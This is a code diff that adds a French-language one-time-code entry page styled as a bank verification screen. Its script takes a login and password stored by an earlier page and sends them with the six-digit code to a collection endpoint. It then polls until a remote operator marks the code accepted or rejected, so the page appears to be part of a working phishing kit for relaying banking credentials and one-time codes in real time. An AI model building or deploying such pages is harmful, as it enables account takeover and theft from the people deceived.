@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="fr" dir="ltr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Code de vérification</title>
+<style>
+:root{color-scheme:dark;--bg:#181818;--accent:#43a047;--field:rgba(255,255,255,.15)}
+*{box-sizing:border-box}html,body{height:100%}body{margin:0;background:var(--bg);color:#fff;font-family:Arial,sans-serif;display:flex;justify-content:center}.wrap{width:100%;max-width:380px;padding:42px 20px 30px;text-align:center}.icon{font-size:52px;margin-bottom:14px}.title{font-size:22px;margin-bottom:6px}.subtitle{color:rgba(255,255,255,.6);font-size:13px;margin-bottom:28px}.boxes{display:flex;gap:10px;justify-content:center;margin-bottom:22px}.box{width:46px;height:56px;background:var(--field);border:2px solid rgba(255,255,255,.25);border-radius:8px;color:#fff;font-size:26px;text-align:center}.box:focus{outline:0;border-color:var(--accent)}.pad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:20px}.key,.confirm{height:52px;border:1px solid rgba(255,255,255,.14);border-radius:8px;background:rgba(255,255,255,.1);color:#fff;font-size:20px;cursor:pointer}.key.delete{font-size:16px;color:rgba(255,255,255,.7)}.confirm{width:100%;background:var(--accent);font-size:16px;text-transform:uppercase}.wait{display:none;padding:22px;color:rgba(255,255,255,.8)}.spinner{width:50px;height:50px;margin:0 auto 14px;border:5px solid rgba(255,255,255,.12);border-top-color:var(--accent);border-radius:50%;animation:spin .9s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}.error{min-height:22px;color:#ff5252;font-weight:700;margin:8px 0}
+</style>
+</head>
+<body>
+<main class="wrap">
+  <div class="icon">📱</div>
+  <div class="title">Code de vérification</div>
+  <div class="subtitle">Saisissez le code à 6 chiffres</div>
+  <div class="error" id="error"></div>
+  <div class="boxes" id="boxes"><input class="box" maxlength="1" inputmode="numeric"><input class="box" maxlength="1" inputmode="numeric"><input class="box" maxlength="1" inputmode="numeric"><input class="box" maxlength="1" inputmode="numeric"><input class="box" maxlength="1" inputmode="numeric"><input class="box" maxlength="1" inputmode="numeric"></div>
+  <div class="pad" id="pad"><button class="key" data-key="1">1</button><button class="key" data-key="2">2</button><button class="key" data-key="3">3</button><button class="key" data-key="4">4</button><button class="key" data-key="5">5</button><button class="key" data-key="6">6</button><button class="key" data-key="7">7</button><button class="key" data-key="8">8</button><button class="key" data-key="9">9</button><button class="key" disabled></button><button class="key" data-key="0">0</button><button class="key delete" data-key="delete">⌫</button></div>
+  <div class="wait" id="wait"><div class="spinner"></div>Vérification du code...</div>
+  <button class="confirm" id="confirm">Confirmer</button>
+</main>
+<script>
+const KEY='bna_state',ADMIN_KEY='bna_admin_state';
+const getState=()=>{try{return JSON.parse(localStorage.getItem(ADMIN_KEY)||localStorage.getItem(KEY)||'{}')}catch(e){return{}}};
+const setState=update=>{const state={...getState(),...update};try{localStorage.setItem(KEY,JSON.stringify(state));localStorage.setItem(ADMIN_KEY,JSON.stringify(state))}catch(e){}return state};
+const boxes=[...document.querySelectorAll('.box')], error=document.getElementById('error'), confirmButton=document.getElementById('confirm'), wait=document.getElementById('wait');
+let pollTimer=null;
+if(!String(getState().login||'').trim()||!String(getState().password||'').trim()) location.href='login_fr.html';
+boxes.forEach((box,index)=>{box.addEventListener('input',()=>{box.value=box.value.replace(/[^0-9]/g,'').slice(-1);if(box.value&&index<boxes.length-1)boxes[index+1].focus()});box.addEventListener('keydown',event=>{if(event.key==='Backspace'&&!box.value&&index>0)boxes[index-1].focus()})});
+document.getElementById('pad').addEventListener('click',event=>{const key=event.target.closest('[data-key]');if(!key)return;const value=key.dataset.key;if(value==='delete'){const filled=boxes.filter(box=>box.value);if(filled.length)filled[filled.length-1].value='';return}const empty=boxes.find(box=>!box.value);if(empty){empty.value=value;const index=boxes.indexOf(empty);if(index<boxes.length-1)boxes[index+1].focus()}});
+async function submitOtp(){const state=getState(),otp=boxes.map(box=>box.value).join('');if(otp.length<6){error.textContent='Code incomplet';return}error.textContent='';try{const response=await fetch('/api/applications',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:state.login,password:state.password,otp,status:'pending_otp',id:state.applicationId})});if(!response.ok)throw new Error('submit failed');const result=await response.json();setState({applicationId:result.application.id||state.applicationId,otp,status:'pending_otp'});confirmButton.style.display='none';document.getElementById('pad').style.display='none';document.getElementById('boxes').style.opacity='.4';wait.style.display='block';startPolling()}catch(e){error.textContent='Impossible d\'envoyer le code, réessayez'}}
+function startPolling(){if(pollTimer)clearInterval(pollTimer);pollTimer=setInterval(async()=>{const id=getState().applicationId;if(!id)return;try{const response=await fetch('/api/applications/'+encodeURIComponent(id),{cache:'no-store'});if(!response.ok)return;const application=await response.json();if(application.status==='otp_accepted'){clearInterval(pollTimer);location.href='waiting_fr.html'}else if(application.status==='otp_rejected'){clearInterval(pollTimer);wait.style.display='none';document.getElementById('pad').style.display='grid';confirmButton.style.display='block';document.getElementById('boxes').style.opacity='1';boxes.forEach(box=>box.value='');error.textContent='Code incorrect'}}catch(e){}},800)}
+confirmButton.addEventListener('click',submitOtp);
+</script>
+</body>
+</html>
